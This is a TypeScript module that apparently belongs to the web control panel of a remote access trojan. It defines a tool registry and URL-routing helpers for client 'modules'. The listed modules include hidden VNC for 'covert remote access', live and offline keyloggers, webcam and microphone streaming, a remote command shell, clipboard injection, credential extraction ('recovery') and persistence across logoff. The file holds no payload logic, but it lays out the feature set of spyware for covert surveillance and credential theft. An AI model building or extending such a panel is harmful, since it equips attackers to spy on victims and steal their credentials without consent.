import type { ClientToolDefinition } from '../../../../shared/types/client-tools';

const definitions = {
	'system-info': {
		id: 'system-info',
		title: 'System Info',
		description:
			'Inspect operating system, hardware, and runtime metrics collected from the client.',
		segments: ['overview', 'system-info'],
		target: 'dialog'
	},
	notes: {
		id: 'notes',
		title: 'Notes',
		description: 'Maintain operational notes and annotations for the selected client.',
		segments: ['overview', 'notes'],
		target: 'dialog'
	},
	'hidden-vnc': {
		id: 'hidden-vnc',
		title: 'Hidden VNC',
		description: 'Coordinate hidden VNC sessions for covert remote access.',
		segments: ['control', 'hidden-vnc'],
		target: '_blank'
	},
	'remote-desktop': {
		id: 'remote-desktop',
		title: 'Remote Desktop',
		description: 'Plan standard remote desktop streaming capabilities.',
		segments: ['control', 'remote-desktop'],
		target: '_blank'
	},
	'webcam-control': {
		id: 'webcam-control',
		title: 'Webcam Control',
		description: 'Prepare webcam capture, streaming, and media controls.',
		segments: ['control', 'webcam-control'],
		target: '_blank'
	},
	'audio-control': {
		id: 'audio-control',
		title: 'Audio Control',
		description:
			'Enumerate agent audio hardware and bridge live microphone streams to the controller.',
		segments: ['control', 'audio-control'],
		target: '_blank'
	},
	'keylogger-online': {
		id: 'keylogger-online',
		title: 'Keylogger · Online',
		description: 'Stream live keystrokes with contextual awareness.',
		segments: ['control', 'keylogger', 'online'],
		target: '_blank'
	},
	'keylogger-offline': {
		id: 'keylogger-offline',
		title: 'Keylogger · Offline',
		description: 'Manage offline keylogging buffers and retrieval scheduling.',
		segments: ['control', 'keylogger', 'offline'],
		target: '_blank'
	},
	'keylogger-advanced-online': {
		id: 'keylogger-advanced-online',
		title: 'Keylogger · Advanced Online',
		description: 'Prototype advanced live keylogging with application correlation.',
		segments: ['control', 'keylogger', 'advanced-online'],
		target: '_blank'
	},
	cmd: {
		id: 'cmd',
		title: 'Command Shell',
		description: 'Queue remote shell executions and monitor results.',
		segments: ['control', 'command-shell'],
		target: '_blank'
	},
	'file-manager': {
		id: 'file-manager',
		title: 'File Manager',
		description: 'Draft remote file browsing, transfer, and manipulation workflows.',
		segments: ['management', 'file-manager'],
		target: '_blank'
	},
	'task-manager': {
		id: 'task-manager',
		title: 'Task Manager',
		description: 'Outline remote process inspection and lifecycle management.',
		segments: ['management', 'task-manager'],
		target: '_blank'
	},
	'registry-manager': {
		id: 'registry-manager',
		title: 'Registry Manager',
		description: 'Plan registry exploration and editing capabilities.',
		segments: ['management', 'registry-manager'],
		target: '_blank'
	},
	'startup-manager': {
		id: 'startup-manager',
		title: 'Startup Manager',
		description: 'Configure startup program discovery and modification flows.',
		segments: ['management', 'startup-manager'],
		target: '_blank'
	},
	'clipboard-manager': {
		id: 'clipboard-manager',
		title: 'Clipboard Manager',
		description: 'Manage clipboard monitoring and injection utilities.',
		segments: ['management', 'clipboard-manager'],
		target: '_blank'
	},
	'tcp-connections': {
		id: 'tcp-connections',
		title: 'TCP Connections',
		description: 'Survey active and listening sockets for the client.',
		segments: ['management', 'tcp-connections'],
		target: '_blank'
	},
	recovery: {
		id: 'recovery',
		title: 'Recovery',
		description: 'Assemble recovery tooling for credential and config extraction.',
		segments: ['operations', 'recovery'],
		target: '_blank'
	},
	options: {
		id: 'options',
		title: 'Options',
		description: 'Adjust client runtime preferences and behavioral flags.',
		segments: ['operations', 'options'],
		target: '_blank'
	},
	'open-url': {
		id: 'open-url',
		title: 'Open URL',
		description: 'Cue remote URL launches in a controlled session.',
		segments: ['misc', 'open-url'],
		target: 'dialog'
	},
	'message-box': {
		id: 'message-box',
		title: 'Message Box',
		description: 'Design remote message prompts for user-facing interactions.',
		segments: ['misc', 'message-box'],
		target: 'dialog'
	},
	'client-chat': {
		id: 'client-chat',
		title: 'Client Chat',
		description: 'Prototype two-way messaging pipelines with the agent.',
		segments: ['misc', 'client-chat'],
		target: '_blank'
	},
	'report-window': {
		id: 'report-window',
		title: 'Report Window',
		description: 'Collect and review structured telemetry from the client.',
		segments: ['misc', 'report-window'],
		target: '_blank'
	},
	'ip-geolocation': {
		id: 'ip-geolocation',
		title: 'IP Geolocation',
		description: 'Resolve and visualize the client location from network data.',
		segments: ['misc', 'ip-geolocation'],
		target: '_blank'
	},
	'environment-variables': {
		id: 'environment-variables',
		title: 'Environment Variables',
		description: 'Enumerate and manage environment variables on the client.',
		segments: ['misc', 'environment-variables'],
		target: '_blank'
	},
	reconnect: {
		id: 'reconnect',
		title: 'Reconnect',
		description: 'Coordinate a manual reconnect cycle for the agent.',
		segments: ['system-controls', 'reconnect'],
		target: '_self'
	},
	disconnect: {
		id: 'disconnect',
		title: 'Disconnect',
		description: 'Plan a graceful disconnect from the controller.',
		segments: ['system-controls', 'disconnect'],
		target: '_self'
	},
	shutdown: {
		id: 'shutdown',
		title: 'Shutdown',
		description: 'Draft a workflow to shut the host machine down remotely.',
		segments: ['power', 'shutdown'],
		target: '_self'
	},
	restart: {
		id: 'restart',
		title: 'Restart',
		description: 'Outline restart orchestration with client coordination.',
		segments: ['power', 'restart'],
		target: '_self'
	},
	sleep: {
		id: 'sleep',
		title: 'Sleep',
		description: 'Prepare suspend and resume handling for the client.',
		segments: ['power', 'sleep'],
		target: '_self'
	},
	logoff: {
		id: 'logoff',
		title: 'Logoff',
		description: 'Configure user logoff support while maintaining persistence.',
		segments: ['power', 'logoff'],
		target: '_self'
	}
} satisfies Record<string, ClientToolDefinition>;

export type ClientToolId = keyof typeof definitions;

export const dialogToolIds = [
	'system-info',
	'notes',
	'open-url',
	'message-box'
] as const satisfies readonly ClientToolId[];

const dialogToolSet = new Set<ClientToolId>(dialogToolIds);

export type DialogToolId = (typeof dialogToolIds)[number];

const tools = Object.values(definitions);
const toolsByPath = new Map(tools.map((tool) => [tool.segments.join('/'), tool]));

export function getClientTool(id: ClientToolId): ClientToolDefinition {
	return definitions[id];
}

export function findClientToolBySegments(segments: string[]): ClientToolDefinition | undefined {
	return toolsByPath.get(segments.join('/'));
}

export function buildClientToolUrl(clientId: string, tool: ClientToolDefinition): string {
	const suffix = tool.segments.join('/');
	return suffix ? `/clients/${clientId}/modules/${suffix}` : `/clients/${clientId}/modules`;
}

export function listClientTools(): ClientToolDefinition[] {
	return tools;
}

export function isDialogTool(id: ClientToolId): id is DialogToolId {
	return dialogToolSet.has(id);
}

export type { ClientToolDefinition } from '../../../../shared/types/client-tools';
